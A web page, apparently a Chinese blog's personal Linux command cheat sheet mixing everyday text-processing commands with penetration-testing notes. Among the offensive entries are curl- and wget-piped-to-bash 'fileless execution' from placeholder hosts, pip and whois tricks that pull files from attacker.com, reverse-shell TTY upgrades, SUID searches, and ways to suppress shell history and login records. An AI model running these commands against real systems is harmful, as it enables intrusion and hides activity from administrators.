@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="linux部分命令速查 for me。 命令行的艺术  OSCP Notes    命令解释">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux部分实用命令">
+<meta property="og:url" content="https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="linux部分命令速查 for me。 命令行的艺术  OSCP Notes    命令解释">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-14T04:41:08.000Z">
+<meta property="article:modified_time" content="2024-01-08T09:12:18.000Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=192" sizes="192x192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>Linux部分实用命令</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163969429-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-163969429-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="雪之下二丁目鹤岗八幡宫" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friends</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/%E4%BD%BF%E7%94%A8Amazon-S3%E5%AE%9E%E7%8E%B0%E5%9B%BE%E5%BA%8A/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&text=Linux部分实用命令"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&title=Linux部分实用命令"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux部分实用命令&body=Check out this article: https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&title=Linux部分实用命令"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&name=Linux部分实用命令&description=&lt;p&gt;linux部分命令速查 for me。&lt;/p&gt;
+&lt;a href=&#34;https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md&#34; title=&#34;&#34; target=&#34;&#34;&gt;命令行的艺术&lt;/a&gt;
+
+&lt;a href=&#34;https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--Enumeration--OS--windows--basic_commands.html&#34; title=&#34;&#34; target=&#34;&#34;&gt;OSCP Notes&lt;/a&gt;
+
+
+
+&lt;p&gt;&lt;a href=&#34;https://explainshell.com/&#34;&gt;命令解释&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&t=Linux部分实用命令"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Linux部分实用命令
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">atsud0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-14T04:41:08.000Z" class="dt-published" itemprop="datePublished">2020-04-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Note/">Note</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>linux部分命令速查 for me。</p>
+<a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md" title="" target="">命令行的艺术</a>
+
+<a href="https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--Enumeration--OS--windows--basic_commands.html" title="" target="">OSCP Notes</a>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://explainshell.com/">命令解释</a></p>
+<span id="more"></span>
+
+<p>获取命令帮助的网站<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">gtfobins</a><br><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Runoob</a></p>
+<h3 id="查看用户-用户组"><a href="#查看用户-用户组" class="headerlink" title="查看用户|用户组"></a>查看用户|用户组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure>
+<p>linux中存放用户密码的文件<br><code>/etc/shadow</code> 加密过得~ </p>
+<h3 id="显示某个文件的第几行"><a href="#显示某个文件的第几行" class="headerlink" title="显示某个文件的第几行"></a>显示某个文件的第几行</h3><p>显示文件的5到20行<br><code>sed -n &#39;5,20p&#39; firename </code></p>
+<h3 id="删除文本换行符和空格"><a href="#删除文本换行符和空格" class="headerlink" title="删除文本换行符和空格"></a>删除文本换行符和空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;printf(&quot;%s&quot;,$0)&#125;&#x27; tmp.txt | sed &#x27;s/\ //g&#x27; $1 </span><br></pre></td></tr></table></figure>
+
+<h3 id="linux-下删除文本空行"><a href="#linux-下删除文本空行" class="headerlink" title="linux 下删除文本空行"></a>linux 下删除文本空行</h3><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v &#x27;^$&#x27; file</span><br></pre></td></tr></table></figure>
+<h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;/^$/d&#x27; file</span><br></pre></td></tr></table></figure>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/./ &#123;print&#125;&#x27; file 或 awk &#x27;&#123;if($0!=&quot; &quot;) print&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tr -s &quot;n&quot;</span><br><span class="line"></span><br><span class="line">tr &quot;\n&quot; &quot; &quot; #替换为空格</span><br></pre></td></tr></table></figure>
+<h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>除此之外，vim也可以在查看时。通过命令模式删除空行。vim在命令模式下输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s/^n//g</span><br></pre></td></tr></table></figure>
+<p>意思是全局替换所有以回车开头的字符，替换为空。如果有多个连续的空行，想保留一行。则只需在命令行模式输入下行即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s/^n$//g</span><br></pre></td></tr></table></figure>
+<h3 id="linux-shell-字符串反转-rev"><a href="#linux-shell-字符串反转-rev" class="headerlink" title="linux shell 字符串反转 rev"></a>linux shell 字符串反转 rev</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH|rev</span><br><span class="line">lrep_eroc/nib/rsu/:lrep_rodnev/nib/rsu/:lrep_etis/nib/rsu/:nib/rsu/:nib/lacol/rsu/:nibs/lacol/rsu/</span><br></pre></td></tr></table></figure>
+
+<h3 id="linux-shell-base64"><a href="#linux-shell-base64" class="headerlink" title="linux shell base64"></a>linux shell base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH|base64</span><br><span class="line">L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvYmluOi91c3IvYmluL3NpdGVfcGVy</span><br><span class="line">bDovdXNyL2Jpbi92ZW5kb3JfcGVybDovdXNyL2Jpbi9jb3JlX3BlcmwK</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ox2str/">在线加密解密</a></p>
+<h3 id="查找SUID位的文件"><a href="#查找SUID位的文件" class="headerlink" title="查找SUID位的文件"></a>查找SUID位的文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find / -perm /4000 2&gt;&amp;1 | grep -v “Permission denied”</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="查找目录下的文件最多"><a href="#查找目录下的文件最多" class="headerlink" title="查找目录下的文件最多"></a>查找目录下的文件最多</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -maxdepth 2 -type d -exec bash -c &#x27;n=$(find &#123;&#125; -maxdepth 1 -type f -printf x | wc -c); echo &quot;&#123;&#125; $n&quot;&#x27; \; |sort -k2n</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="查看Linux内核-x2F-系统版本"><a href="#查看Linux内核-x2F-系统版本" class="headerlink" title="查看Linux内核&#x2F;系统版本"></a>查看Linux内核&#x2F;系统版本</h3><p>cat &#x2F;proc&#x2F;version</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">Linux version 5.5.13-arch2-1 (linux@archlinux) (gcc version 9.3.0 (Arch Linux 9.3.0-1)) #1 SMP PREEMPT Mon, 30 Mar 2020 20:42:41 +0000</span><br></pre></td></tr></table></figure>
+<p>uname -a</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux sds0 5.5.13-arch2-1 #1 SMP PREEMPT Mon, 30 Mar 2020 20:42:41 +0000 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<p>-r 只看内核号</p>
+<p>lsb_release -a</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">LSB Version:    1.4</span><br><span class="line">Distributor ID: Arch</span><br><span class="line">Description:    Arch Linux</span><br><span class="line">Release:        rolling</span><br><span class="line">Codename:       n/a</span><br></pre></td></tr></table></figure>
+<p>cat &#x2F;etc&#x2F;issue</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">Arch Linux \r (\l)</span><br></pre></td></tr></table></figure>
+
+<h3 id="curl-部分用法"><a href="#curl-部分用法" class="headerlink" title="curl 部分用法"></a>curl 部分用法</h3><p>模拟浏览器发送get请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>发送POST请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d &quot;flagpls=flagpls&quot; http://ip</span><br></pre></td></tr></table></figure>
+<p><strong>在浏览器开发者工具存储器中可设置cookie</strong></p>
+<p>获取可进行的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://..... -X OPTIONS -v</span><br></pre></td></tr></table></figure>
+
+<p>设置User-agent，不设置ua默认的是curl&#x2F;curl的版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: curl/7.64.1</span><br><span class="line"></span><br><span class="line">那么怎么设置呢？</span><br><span class="line"> -A, --user-agent &lt;name&gt; Send User-Agent &lt;name&gt; to server</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com -A <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果抓包的话就会发现请求包头的UA字段变成了上面那个了。</p>
+<h3 id="wget部分用法"><a href="#wget部分用法" class="headerlink" title="wget部分用法"></a>wget部分用法</h3><p>wget设置UA下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&quot; url</span><br></pre></td></tr></table></figure>
+
+<p>终端输出(不另存为成单独的文件)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O - http://1.1.1.1:8000/linpeas.sh</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="python打开tty，nc升级完全交互式的TTY"><a href="#python打开tty，nc升级完全交互式的TTY" class="headerlink" title="python打开tty，nc升级完全交互式的TTY"></a>python打开tty，nc升级完全交互式的TTY</h3><a href="https://cloud.tencent.com/developer/article/1047405" title="" target="">如何将简单的Shell转换成为完全交互式的TTY</a>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># Bash</span><br><span class="line">## In reverse shell</span><br><span class="line"></span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">目标系统没有python时可用:SHELL=/bin/bash script -q /dev/null </span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line">## In Kali	</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line"></span><br><span class="line">## In reverse shell</span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">export TERM=xterm</span><br><span class="line">stty rows 48 cols 99</span><br><span class="line"></span><br><span class="line"># Zsh</span><br><span class="line">## In reverse shell</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">目标系统没有python时可用:SHELL=/bin/bash script -q /dev/null </span><br><span class="line"># 没有bash的时候用sh也可以 SHELL=/bin/sh script -q /dev/null </span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line">## In Kali zsh,you need to used one command line</span><br><span class="line"></span><br><span class="line">stty raw -echo;fg </span><br><span class="line"></span><br><span class="line">### In reverse shell</span><br><span class="line"></span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">export TERM=xterm</span><br><span class="line">stty rows 48 cols 99</span><br></pre></td></tr></table></figure>
+
+<h3 id="python部署简易网站"><a href="#python部署简易网站" class="headerlink" title="python部署简易网站"></a>python部署简易网站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer # 不指定端口默认8000</span><br><span class="line">python -m http.server</span><br><span class="line">python3 -m updog --ssl --password 123456 -p 80 #不是自带库，需要安装。</span><br></pre></td></tr></table></figure>
+
+<h3 id="不验证证书进行https请求"><a href="#不验证证书进行https请求" class="headerlink" title="不验证证书进行https请求"></a>不验证证书进行https请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget &#x27;https://x.x.x.x/get_ips&#x27; --no-check-certificate</span><br><span class="line">curl &#x27;https://x.x.x.x/get_ips&#x27; -k</span><br><span class="line">gobuster dir -u &#x27;https://x.x.x.x/&#x27; -w ~/big.txt -k</span><br><span class="line">feroxbuster --url &#x27;https://x.x.x.x/&#x27; --wordlist ~/big.txt -k</span><br></pre></td></tr></table></figure>
+
+<h3 id="设置term"><a href="#设置term" class="headerlink" title="设置term"></a>设置term</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>
+
+<h3 id="Arch-查询滚了多少次-…"><a href="#Arch-查询滚了多少次-…" class="headerlink" title="Arch 查询滚了多少次(…)"></a>Arch 查询滚了多少次(…)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(head -n1 /var/log/pacman.log | cut -d &quot; &quot; -f 1,2) 以来一共滚了 $(grep -c &quot;full system upgrade&quot; /var/log/pacman.log) 次</span><br></pre></td></tr></table></figure>
+
+<h3 id="渗透过程中不记录历史命令"><a href="#渗透过程中不记录历史命令" class="headerlink" title="渗透过程中不记录历史命令"></a>渗透过程中不记录历史命令</h3><p><code>export HISTFILE=/dev/null</code> 将HISTFILE设置为&#x2F;dev&#x2F;null</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <span class="comment">#可以不被记录命令</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> | zsh <span class="comment">#这个也可以</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>避免登录被记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1</span><br><span class="line"></span><br><span class="line">#进去后是没有交互式终端的，可以自己用nc会话升级的办法升级。升级之后w也是查看不到在已登陆用户。</span><br></pre></td></tr></table></figure>
+
+<h3 id="无文件落地执行"><a href="#无文件落地执行" class="headerlink" title="无文件落地执行"></a>无文件落地执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -L http://aaaa.com/a.sh|bash</span><br><span class="line"></span><br><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://aaaa/a.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line">wget -q -O - http://1.1.1.1/a.sh|bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dos格式文件快速转为Unix"><a href="#Dos格式文件快速转为Unix" class="headerlink" title="Dos格式文件快速转为Unix"></a>Dos格式文件快速转为Unix</h3><p>使用vi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set fileformat=unix</span><br><span class="line">:w</span><br></pre></td></tr></table></figure>
+
+<p>dos2unix</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dos2unix filename</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Linux-命令行下快速编解码hex"><a href="#Linux-命令行下快速编解码hex" class="headerlink" title="Linux 命令行下快速编解码hex"></a>Linux 命令行下快速编解码hex</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo -n abc|xxd -ps</span><br><span class="line">616263 </span><br><span class="line"># 解码hex数据</span><br><span class="line">$ echo 616263|xxd -ps -r</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Linux使用impakcet快速开启一个SMB共享目录"><a href="#Linux使用impakcet快速开启一个SMB共享目录" class="headerlink" title="Linux使用impakcet快速开启一个SMB共享目录"></a>Linux使用<code>impakcet</code>快速开启一个SMB共享目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/exapmles/smbserver.py -comment <span class="string">&quot;My Share&quot;</span> TMP /tmp  </span><br></pre></td></tr></table></figure>
+
+<h3 id="PIP下载文件"><a href="#PIP下载文件" class="headerlink" title="PIP下载文件"></a>PIP下载文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">export URL=http://attacker.com/file_to_get</span><br><span class="line"></span><br><span class="line">export LFILE=/tmp/file_to_save</span><br><span class="line"></span><br><span class="line">TF=\$(mktemp -d)</span><br><span class="line"></span><br><span class="line">echo &#x27;import sys; from os import environ as e</span><br><span class="line"></span><br><span class="line">if sys.version_info.major == 3: import urllib.request as r</span><br><span class="line"></span><br><span class="line">else: import urllib as r</span><br><span class="line"></span><br><span class="line">r.urlretrieve(e[&quot;URL&quot;], e[&quot;LFILE&quot;])&#x27; \&gt; \$TF/setup.py</span><br><span class="line"></span><br><span class="line">pip install \$TF</span><br></pre></td></tr></table></figure>
+
+<h3 id="whois传输文件"><a href="#whois传输文件" class="headerlink" title="whois传输文件"></a>whois传输文件</h3><p>攻击机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 12345 &lt; &quot;abc&quot;</span><br><span class="line"></span><br><span class="line">## 传递二进制文件</span><br><span class="line">base64 &quot;file_to_send&quot; \| nc -l -p 12345</span><br></pre></td></tr></table></figure>
+
+<p>靶机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RHOST=attacker.com</span><br><span class="line">RPORT=12345</span><br><span class="line">LFILE=file_to_save</span><br><span class="line">whois -h \$RHOST -p \$RPORT \&gt; &quot;\$LFILE&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="切换java版本"><a href="#切换java版本" class="headerlink" title="切换java版本"></a>切换java版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure>
+
+<h3 id="编译32位且动态链接库文件很老的二进制文件"><a href="#编译32位且动态链接库文件很老的二进制文件" class="headerlink" title="编译32位且动态链接库文件很老的二进制文件"></a>编译32位且动态链接库文件很老的二进制文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wl,--hash-style=both -m32 -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure>
+
+
+
